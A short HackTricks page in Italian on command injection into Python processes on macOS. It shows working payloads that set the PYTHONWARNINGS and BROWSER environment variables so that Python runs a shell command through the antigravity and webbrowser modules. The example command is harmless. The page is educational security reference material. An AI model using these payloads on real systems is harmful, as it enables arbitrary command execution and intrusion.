# Injection nelle applicazioni Python di macOS

{{#include ../../../banners/hacktricks-training.md}}

## Tramite le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`

Se un attaccante può controllare l'ambiente di un processo Python, la combinazione di `PYTHONWARNINGS` e `BROWSER` può attivare l'esecuzione di comandi quando Python importa il modulo `antigravity` durante l'elaborazione di un'opzione di avviso appositamente predisposta. La tecnica si basa sul fatto che `antigravity` apra un URL con il modulo `webbrowser` di Python, che rispetta la variabile d'ambiente `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking con le variabili d'ambiente - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
